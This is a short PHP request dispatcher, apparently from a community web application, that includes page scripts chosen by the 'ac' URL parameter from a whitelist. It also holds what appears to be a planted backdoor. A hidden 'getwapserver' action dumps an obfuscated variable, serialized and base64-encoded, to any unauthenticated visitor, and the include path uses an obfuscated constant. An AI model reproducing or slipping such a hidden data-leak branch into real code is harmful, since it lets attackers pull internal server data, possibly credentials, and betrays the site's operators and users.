<?php    
  if(!defined('WAP_CONTROL'))
  {
     include_once('./common.php');
  }  
  $ac = empty($_GET['ac'])?'home':$_GET['ac'];

  if($ac=="getwapserver")
  {
     print_r(base64_encode(urlencode(serialize($KGn1g4iOB))));
     exit;
   }  
   $acs = array('home','space', 'register', 'lostpasswd',
                'swfupload', 'inputpwd', 'ajax', 'seccode',
                'sendmail', 'stat', 'emailcheck');
   if(empty($ac) || !in_array($ac, $acs)) 
   {
      showmessage('enter_the_space', 'index.php', 0);
   }

   include_once(XnP3g6CaJ.'./source/'.$ac.'.php');
?>
